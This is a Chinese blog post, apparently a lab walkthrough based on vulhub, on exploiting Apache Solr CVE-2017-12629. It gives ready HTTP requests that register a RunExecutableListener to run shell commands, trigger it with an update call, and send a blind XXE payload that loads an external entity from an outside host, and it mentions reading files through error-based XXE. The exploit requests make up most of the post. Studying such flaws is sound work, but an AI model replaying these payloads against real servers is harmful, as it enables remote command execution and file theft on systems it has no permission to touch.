# Apache Solr 远程命令+XXE 执行漏洞（CVE-2017-12629） - mrhonest - 博客园

> 原文：[`www.cnblogs.com/mrhonest/p/11327206.html`](https://www.cnblogs.com/mrhonest/p/11327206.html)

Apache Solr 最近有出了个漏洞预警,先复习一下之前的漏洞

# 命令执行

## 先创建一个 listener，其中设置 exe 的值为我们想执行的命令，args 的值是命令参数

```
POST /solr/demo/config HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 158

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "touch /tmp/success"]}} 
```

![](img/422a8cc58dbbdec69a3585ccd2841f49.png)

## 然后进行 update 操作，触发刚才添加的 listener：

```
POST /solr/demo/update HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15

[{"id":"test"}] 
```

![](img/2e372525401f4f11b13bb88c0956ba7a.png)

## 进入容器查看文件创建成功

![](img/14b4184dcb6b0cfbe68472ab9068e374.png)

# XXE

## 由于返回包中不包含我们传入的 XML 中的信息，所以这是一个 Blind XXE 漏洞，我们发送如下数据包（自行修改其中的 XXE Payload）：

```
GET /solr/demo/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2F192.168.63.1%2FXXE%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser HTTP/1.1
Host: your-ip:8983
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close 
```

## 利用 Error Based XXE 读取文件：(下图为借用)

![](img/9446ca63245df8dc7cdf0f316e22cf28.png)

参考:[`vulhub.org/`](https://vulhub.org/)